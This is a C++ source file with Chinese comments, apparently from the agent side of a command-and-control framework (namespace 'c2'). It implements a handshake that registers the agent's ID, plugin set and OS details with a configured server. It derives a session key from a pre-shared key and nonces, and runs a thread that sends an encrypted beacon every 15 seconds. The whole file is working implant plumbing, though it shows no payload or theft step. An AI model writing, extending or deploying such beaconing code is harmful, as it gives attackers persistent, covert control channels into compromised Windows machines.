// session.cpp — 握手与心跳实现
#include "pch.h"
#include "session.h"

#include "crypto.h"
#include "net.h"
#include "protocol.h"

#include <bcrypt.h>
#include <cstring>
#include <process.h>

namespace c2
{

    namespace
    {

        // 组装 HELLO payload（明文）：ver(4) + role(1) + agent_id(16) + client_nonce(16)
        //   [AGENT 附加] plugins(4) + os_len(2) + os
        void build_hello(const AgentConfig &cfg, uint8_t client_nonce[16],
                         std::vector<uint8_t> &out)
        {
            out.clear();
            uint32_t ver = kHelloVersion;
            out.push_back((uint8_t)(ver & 0xFF));
            out.push_back((uint8_t)((ver >> 8) & 0xFF));
            out.push_back((uint8_t)((ver >> 16) & 0xFF));
            out.push_back((uint8_t)((ver >> 24) & 0xFF));
            out.push_back(kRoleAgent);
            out.insert(out.end(), cfg.agent_id, cfg.agent_id + kAgentIdLen);
            out.insert(out.end(), client_nonce, client_nonce + kClientNonceLen);
            // AGENT 附加
            uint32_t plugins = cfg.plugins_bitmap;
            out.push_back((uint8_t)(plugins & 0xFF));
            out.push_back((uint8_t)((plugins >> 8) & 0xFF));
            out.push_back((uint8_t)((plugins >> 16) & 0xFF));
            out.push_back((uint8_t)((plugins >> 24) & 0xFF));
            uint16_t os_len = (uint16_t)cfg.os_info.size();
            out.push_back((uint8_t)(os_len & 0xFF));
            out.push_back((uint8_t)(os_len >> 8));
            out.insert(out.end(), cfg.os_info.begin(), cfg.os_info.end());
        }

    } // namespace

    bool session_handshake(Session &s, const AgentConfig &cfg, std::string &err)
    {
        SOCKET sock = INVALID_SOCKET;
        if (!net_connect(cfg.host, cfg.port, &sock, 5000))
        {
            err = "connect failed: " + net_last_error();
            return false;
        }

        // 生成 client_nonce
        uint8_t client_nonce[kClientNonceLen];
        BCryptGenRandom(nullptr, client_nonce, kClientNonceLen,
                        BCRYPT_USE_SYSTEM_PREFERRED_RNG);

        // HELLO（明文）
        std::vector<uint8_t> hello;
        build_hello(cfg, client_nonce, hello);
        Header h;
        h.cmd = kCmdHello;
        if (!net_write_packet(sock, h, hello.data(), hello.size()))
        {
            err = "send hello failed: " + net_last_error();
            net_close(sock);
            return false;
        }

        // HELLO_ACK（明文）
        Header ack_h;
        std::vector<uint8_t> ack;
        if (!net_read_packet(sock, ack_h, ack, 5000))
        {
            err = "read hello_ack failed: " + net_last_error();
            net_close(sock);
            return false;
        }
        if (ack_h.cmd != kCmdHelloAck)
        {
            err = "expected HELLO_ACK";
            net_close(sock);
            return false;
        }
        if (ack.size() < 1 + kServerNonceLen || ack[0] != 0)
        {
            err = "handshake rejected";
            net_close(sock);
            return false;
        }
        const uint8_t *server_nonce = ack.data() + 1;

        // 派生会话密钥
        s.key = derive_session_key(cfg.psk.data(), cfg.psk.size(),
                                   client_nonce, server_nonce);
        s.sock = sock;
        return true;
    }

    unsigned __stdcall heartbeat_proc(void *param)
    {
        HeartbeatCtx *ctx = static_cast<HeartbeatCtx *>(param);
        Session *s = ctx->s;
        const AgentConfig *cfg = ctx->cfg;
        std::atomic<bool> *running = ctx->running;

        // 心跳 payload：agent_id(16) + plugins(4) + cpu%(1) + mem%(1)
        std::vector<uint8_t> payload(kAgentIdLen + 4 + 1 + 1);
        std::memcpy(payload.data(), cfg->agent_id, kAgentIdLen);
        uint32_t plugins = cfg->plugins_bitmap;
        payload[kAgentIdLen + 0] = (uint8_t)(plugins & 0xFF);
        payload[kAgentIdLen + 1] = (uint8_t)((plugins >> 8) & 0xFF);
        payload[kAgentIdLen + 2] = (uint8_t)((plugins >> 16) & 0xFF);
        payload[kAgentIdLen + 3] = (uint8_t)((plugins >> 24) & 0xFF);
        payload[kAgentIdLen + 4] = 0; // CPU% 不采集
        payload[kAgentIdLen + 5] = 0; // MEM% 不采集

        while (running->load())
        {
            Sleep(15000); // 心跳周期 15s
            if (!running->load())
                break;

            std::vector<uint8_t> sealed;
            std::string err;
            if (!aes_gcm_encrypt(s->key.data(), s->key.size(),
                                 payload.data(), payload.size(), sealed, err))
            {
                break;
            }
            Header h;
            h.flags = kFlagEncrypted;
            h.cmd = kCmdHeartbeat;
            h.seq = ++s->seq; // 严格递增（服务端防重放要求）
            h.timestamp = GetTickCount64();
            if (!net_write_packet(s->sock, h, sealed.data(), sealed.size()))
                break; // 连接断开
        }
        return 0;
    }

} // namespace c2
